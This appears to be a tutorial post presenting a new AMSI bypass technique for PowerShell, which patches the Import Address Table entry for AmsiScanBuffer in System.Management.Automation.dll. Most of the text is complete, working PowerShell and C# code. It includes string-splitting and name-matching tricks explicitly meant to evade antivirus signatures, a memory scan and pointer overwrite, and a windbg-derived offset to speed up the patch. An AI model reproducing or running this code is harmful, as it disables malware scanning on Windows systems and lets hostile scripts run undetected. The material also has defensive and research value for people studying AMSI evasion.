**[New Technique] AMSI BYPASS - CLR Patching**

***Author: Vixx***
***Level: Advanced***

Most of the Amsi bypasses out there, is about patching `Amsi.dll`.

In Powershell, `AmsiScanBuffer` routine in `Amsi.dll` is called by the Common Language Runtime (CLR) in a routine called `ScanContent` inside `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`

Running in your powershell `[PSObject].Assembly.Location` will expose the location of the dll for you to reverse it using `dnsspy`.

![ScanContent](ScanContent.png)

So one of the public bypasses out there is called `CLR Hooking` which involve changing the protection of `ScanContent` by invoking `VirtualProtect` and overwriting it with a hook that just return true.

but it is already heavely signatured and involve running `VirtualProtect` which is not good against EDR's and AV's.

What I am going to show today is in interesting technique which is about patching the IAT entry in `System.Management.Automation.dll` containing the `AmsiScanBuffer` Address that is actually fetched and called by `ScanContent`.

we will start by this piece of code which will load and import the required api's for us in c# and compile it in powershell.

the `dummy` function will be used later on to overwrite the Import Address Table (IAT) Entry.

```
$APIs = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
        return 1;
    }
}
"@

Add-Type $APIs
```

Next, we will go through the loaded assemblies at runtime in powershell and search for `ScanContent` method dynamicaly which is inside the `AmsiUtils` Class in `System.Management.Automation.dll` assembly.

This is possible because `System.Management.Automation.dll` is already loaded to the powershell process for use.

So the next piece of code will search in a smart way (to bypass AV signatures) by checking the first and the last letter of the assembly `FullName property` with the right length as well to find the `System.Management.Automation.dll` and then get all the types of that assembly (which means get all the classes of that assembly)

```
$Assemblies = [appdomain]::currentdomain.getassemblies()
$Assemblies |
  ForEach-Object {
    if($_.Location -ne $null){
        $split1 = $_.FullName.Split(",")[0]
        If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
            $Types = $_.GetTypes()
        }
    }
}
```

The next piece of code will go and search for `AmsiUtils` class inside our assembly and get all the methods inside it.

```
$Types |
  ForEach-Object {
    if($_.Name -ne $null){
        If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
            $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
        }
    }
}
```

Next, we are gonna go and search for the `ScanContent` function inside the methods that we gathered from `AmsiUtils` Class.

```
$Methods |
  ForEach-Object {
    if($_.Name -ne $null){
        If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
           $MethodFound = $_
        }
    }
}
```

`MethodFound` will contain the handle to the `ScanContent` routine.

The next piece of code will give us the address of that routine.

```
[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
```

Next we will use `GetModuleHandle` and `GetProcAddress` to get the address of the `AmsiScanBuffer` function in `Amsi.dll`.

This is important because we are gonna search for `AmsiScanBuffer` address inside the `System.Management.Automation.dll` starting from the `ScanContent` routine that we have and keep searching backward, till we find the entry of `AmsiScanBuffer` and we replace it with the `dummy` function address.

We did some replacements on the `hello, world` string below to build the amsi strings in a stealthy way to bypass AV signature.

```
$string = 'hello, world'
$string = $string.replace('he','a')
$string = $string.replace('ll','m')
$string = $string.replace('o,','s')
$string = $string.replace(' ','i')
$string = $string.replace('wo','.d')
$string = $string.replace('rld','ll')

$string2 = 'hello, world'
$string2 = $string2.replace('he','A')
$string2 = $string2.replace('ll','m')
$string2 = $string2.replace('o,','s')
$string2 = $string2.replace(' ','i')
$string2 = $string2.replace('wo','Sc')
$string2 = $string2.replace('rld','an')

$string3 = 'hello, world'
$string3 = $string3.replace('hello','Bu')
$string3 = $string3.replace(', ','ff')
$string3 = $string3.replace('world','er')

$Address = [APIS]::GetModuleHandle($string)
[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)
```

The next piece of code will search byte by byte and compare each 8 bytes to the address of `AmsiScanBuffer` till found.

```
[IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer # PS5 - 11000000
[IntPtr] $Handle = [APIs]::GetCurrentProcess()
$dummy = 0


while($true) {
	$ReadedMemoryArray = [byte[]]::new(0x07)
	$test = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, 0x07,[ref]$dummy)
    $bytes = [byte[]]($ReadedMemoryArray[0], $ReadedMemoryArray[1], $ReadedMemoryArray[2], $ReadedMemoryArray[3], $ReadedMemoryArray[4], $ReadedMemoryArray[5], $ReadedMemoryArray[6], $ReadedMemoryArray[7])
    [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
    if ($PointerToCompare -eq $funcAddr) {
        Write-Host "Found @ $($MethodPointerToSearch)!" 
        [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch
        break
    }
    else{
    	[IntPtr] $MethodPointerToSearch = [Int64] $MethodPointerToSearch - 1
    }
}
```

After finding the address of `AmsiScanBuffer`, we can replace it with our `dummy` function with the following code.

```
[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
$buf = [IntPtr[]] ($DummyPointer)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
```

Now this piece of code is quite universal, its gonna search for `AmsiScanBuffer` Address starting from `ScanCotent` function in `System.Management.Automation.dll` backwards, till it is found and patch it.

it doesn't involve running `VirtualProtect` api, as the IAT is already writabe.

In `Powershell 7` this is quite fast but in `Powershell 5`, this will take up to 4 mins, so to improve this, you can substract some offset from the `ScanContent` address where the search starts and which will get you closer to the `AmsiScanBuffer` IAT entry.

you can also just use an offset, without even using `GetModuleHandle` and `GetProcAddress`, but this can change between powershell clr versions.

so let's try to subtract an offset to make it a bit faster.

lets start by attaching powershell to windbg and then run the POC.

lets set a breakpoint on `AmsiScanBuffer`

![BreakPoint](BreakPoint.png)

And run anything in powershell to break in windbg at the `AmsiScanBuffer` routine.

let's check the callstack

![call_stack](call_stack.png)

let's unassemble back from the second entry that initiated the call to `AmsiScanBuffer` and see what's going on.

![ub1](ub1.png)

The `call rax` is the call to `AmsiScanBuffer`, taking a close look before the call, we can see how rax was fetched. 

Let's replicate that in windbg to get where the address of `AmsiScanBuffer` IAT entry is.

![ub2](ub2.png)

`7ff89caa1d0` is the hex representation of the address of `ScanContent` that powershell gathered for us.

![MethodPointer](MethodPointer.png)

And so the difference between `ScanContent` and the `AmsiScanBuffer` IAT Entry is `0xabb2a0` => which is `11252384` in decimal.

so substracting an offset of `11000000` will make the bypass pretty fast now. (you may have to change the offset or tweak it in different versions of CLR)

```
[IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - 11000000
```

![POC](POC.png)
